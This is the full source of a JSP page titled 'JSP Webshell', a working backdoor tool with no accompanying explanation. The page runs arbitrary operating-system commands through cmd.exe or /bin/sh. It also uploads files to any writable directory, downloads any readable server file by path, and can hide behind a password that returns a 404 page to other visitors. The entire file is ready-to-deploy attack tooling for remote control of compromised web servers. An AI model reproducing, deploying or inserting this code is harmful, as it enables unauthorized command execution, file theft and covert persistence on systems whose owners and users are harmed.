<%@ page import="java.io.BufferedReader,java.io.ByteArrayOutputStream,java.io.File,java.io.FileInputStream,java.io.FileOutputStream,java.io.InputStreamReader,java.nio.ByteBuffer,java.util.regex.Matcher,java.util.regex.Pattern" trimDirectiveWhitespaces="true" %>
<%!
    String htmlEscape(String in) {
        return in.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("\"", "&quot;").replaceAll("'", "&#039;");
    }
%>
<%
    String stealthPassword = "";
    if(!stealthPassword.equals("") && !stealthPassword.equals(request.getParameter("pw"))) {
        response.setStatus(404);
        return;
    }

    String downloadFile = request.getParameter("downloadFile");
    String downloadMsg = "";
    if(downloadFile != null) {
        File f = new File(downloadFile);
        if(f.canRead()) {
            response.setContentType("application/octet-stream");
            response.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");
            FileInputStream fis = new FileInputStream(f);
            int i;
            while((i = fis.read()) != -1) {
                out.write(i);
            }
            fis.close();
            out.close();
        } else {
            downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br />\n";
        }
    }

    String uploadMsg = "";
    String contentType = request.getHeader("Content-Type");
    if(contentType != null && contentType.startsWith("multipart/form-data")) {
        byte[] boundary = contentType.substring(30).getBytes("ASCII");
        ServletInputStream sis = request.getInputStream();
        byte[] buf = new byte[8192];
        int c;
        boolean nextIsContentDisposition = false;
        boolean nextIsUploadDir = false;
        boolean nextIsFile = false;
        String uploadDir = "";
        String fileName = null;
        ByteArrayOutputStream baos = null;
        while((c = sis.readLine(buf, 0, 8192)) != -1) {
            if(ByteBuffer.wrap(buf, 2, boundary.length).equals(ByteBuffer.wrap(boundary))) {
                nextIsContentDisposition = true;
                if(nextIsUploadDir) {
                    nextIsUploadDir = false;
                    uploadDir = uploadDir.substring(0, uploadDir.length()-2);
                    uploadDir = uploadDir.length() > 0 ? uploadDir : ".";
                    if(! new File(uploadDir).canWrite()) {
                        uploadMsg += "Cannot write to directory <code>" + htmlEscape(uploadDir) + "</code><br />\n";
                        break;
                    }
                } else if(nextIsFile) {
                    nextIsFile = false;
                    File f = new File(uploadDir, fileName);
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(baos.toByteArray(), 0, baos.size()-2);
                    fos.close();
                    uploadMsg += "Successfully uploaded <code>" + htmlEscape(fileName) + "</code> to <code>" + htmlEscape(f.getPath()) + "</code><br />\n";
                }
            } else if(nextIsContentDisposition) {
                nextIsContentDisposition = false;
                String contentDisposition = new String(buf, 0, c, "UTF-8");
                Matcher m = Pattern.compile("; name=\"([^\"]*)\"(?:; filename=\"([^\"]*)\")?").matcher(contentDisposition);
                m.find();
                String paramName = m.group(1);
                if(paramName.equals("uploadDir")) {
                    nextIsUploadDir = true;
                } else if(paramName.equals("uploadFiles[]")) {
                    nextIsFile = true;
                    fileName = m.group(2);
                    baos = new ByteArrayOutputStream();
                }
                while((c = sis.readLine(buf, 0, 8192)) != -1) {
                    if(new String(buf, 0, c, "UTF-8").trim().length() == 0) {
                        break;
                    }
                }
            } else if(nextIsUploadDir) {
                uploadDir += new String(buf, 0, c, "UTF-8");
            } else if(nextIsFile) {
                baos.write(buf, 0, c);
            }
        }
        sis.close();
    }

    String shell = null;
    String shellOpt = null;
    String cmd = request.getParameter("cmd");
    Integer exitCode = null;
    StringBuilder stdout = new StringBuilder("");
    if(request.getMethod().equals("POST") && cmd != null && !cmd.trim().equals("")) {
        String codepage = (String) request.getSession().getAttribute("cmd_codepage");
        String osName = System.getProperty("os.name").toLowerCase();
        if(osName.contains("windows")) {
            shell = "cmd.exe";
            shellOpt = "/c";
            if(codepage == null) {
                Process p = new ProcessBuilder(shell, shellOpt, "chcp").start();
                BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                Matcher m = Pattern.compile("\\s(\\d+)\\.").matcher(stdoutReader.readLine());
                m.find();
                codepage = m.group(1);
                request.getSession().setAttribute("cmd_codepage", codepage);
            }
        } else {
            shell = "/bin/sh";
            shellOpt = "-c";
        }
        ProcessBuilder pb = new ProcessBuilder(shell, shellOpt, cmd);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        InputStreamReader isr;
        if(codepage == null) {
            isr = new InputStreamReader(p.getInputStream());
        } else {
            isr = new InputStreamReader(p.getInputStream(), codepage);
        }
        BufferedReader stdoutReader = new BufferedReader(isr);
        String s;
        while((s = stdoutReader.readLine()) != null) {
            stdout.append(s).append(System.getProperty("line.separator"));
        }
        exitCode = p.waitFor();
    }
%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>JSP Webshell</title>
        <style>
            body {
                font-family: sans-serif;
            }
            input[type=text] {
                font-family: monospace;
            }
            .cmdBox {
                width: 80%;
            }
            .infoText {
                margin: 3px auto;
            }
            .featureBox {
                margin: 1rem auto;
            }
        </style>
    </head>
    <body>
        <form id="cmdForm" method="POST" action="">
            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
            <input type="submit" value="Run" />
        </form>
        <div class="infoText">
<%
    if(shell != null) {
        out.println("Output of command <code>" + htmlEscape(shell) + " " + htmlEscape(shellOpt) + "</code> with argument: <code>" + htmlEscape(cmd) + "</code>");
    } else {
        out.println("Run a command to see its output");
    }
%>
        </div>
        <textarea readonly="readonly" rows="25" class="cmdBox">
<%= htmlEscape(stdout.toString()) %>
        </textarea>
        <div class="infoText">
<%
    if(exitCode != null) {
        out.println("Exit code: <code>" + exitCode + "</code>");
    }
%>
        </div>
        <div class="featureBox">
            <b>File Upload</b>
            <div>
<%= uploadMsg %>
            </div>
            <form method="POST" action="" enctype="multipart/form-data">
                <input type="text" name="uploadDir" placeholder="Destination folder" />
                <input type="file" name="uploadFiles[]" multiple="multiple" />
                <input type="submit" value="Upload" />
            </form>
        </div>
        <div class="featureBox">
            <b>File Download</b>
            <div>
<%= downloadMsg %>
            </div>
            <form method="POST" action="">
                <input type="text" name="downloadFile" placeholder="File to download" />
                <input type="submit" value="Download" />
            </form>
        </div>
        <script>
            function saveHistory() {
                var cmd = document.getElementById("cmd").value;
                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
                    shellHistory.push(cmd);
                }
                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
            }
            function cycleHistory(event) {
                var cmdInput = document.getElementById("cmd");
                if(event.code == "ArrowUp" && historyPos > 0) {
                    historyPos--;
                    cmdInput.value = shellHistory[historyPos];
                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
                    historyPos++;
                    if(historyPos < shellHistory.length) {
                        cmdInput.value = shellHistory[historyPos];
                    } else {
                        cmdInput.value = "";
                    }
                }
                if(event.code == "ArrowUp" || event.code == "ArrowDown") {
                    cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
                    event.preventDefault();
                }
            }
            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
            if(shellHistory == null) {
                shellHistory = new Array();
            }
            var historyPos = shellHistory.length;
            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
        </script>
    </body>
</html>
